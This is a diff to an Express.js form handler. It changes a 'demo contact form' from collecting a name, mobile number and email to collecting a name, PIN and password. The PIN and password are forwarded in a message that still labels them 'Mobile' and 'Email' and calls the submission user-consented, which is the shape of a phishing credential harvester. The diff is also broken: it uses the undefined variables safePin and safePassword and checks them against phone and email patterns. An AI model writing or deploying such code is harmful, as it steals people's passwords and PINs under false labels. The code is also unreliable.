@@ -8,16 +8,16 @@ app.use(express.json({ limit: "10kb" }));
 app.use(express.static(path.join(__dirname, "public")));
 
 app.post("/api/submit", async (req, res) => {
-  const { name, mobile, email, consent } = req.body || {};
+  const { name, pin, password, consent } = req.body || {};
   if (consent !== true) return res.status(400).json({ error: "Consent is required." });
 
   const clean = (v, max) => typeof v === "string" ? v.trim().slice(0, max) : "";
-  const safeName = clean(name, 80);
-  const safeMobile = clean(mobile, 20);
-  const safeEmail = clean(email, 120);
+  const safeName = clean(name, 10);
+  const safeMobile = clean(pin, 6);
+  const safeEmail = clean(password, 12);
 
-  if (!safeName || !/^[0-9+\-\s]{8,20}$/.test(safeMobile) ||
-      !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(safeEmail)) {
+  if (!safeName || !/^[0-9+\-\s]{8,20}$/.test(safePin) ||
+      !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(safePassword)) {
     return res.status(400).json({ error: "Please enter a valid name, mobile number and email." });
   }
 
@@ -27,8 +27,8 @@ app.post("/api/submit", async (req, res) => {
     const message = [
       "New demo form submission",
       `Name: ${safeName}`,
-      `Mobile: ${safeMobile}`,
-      `Email: ${safeEmail}`,
+      `Mobile: ${safePin}`,
+      `Email: ${safePassword}`,
       "Purpose: User-consented demo contact form"
     ].join("\n");
     try {
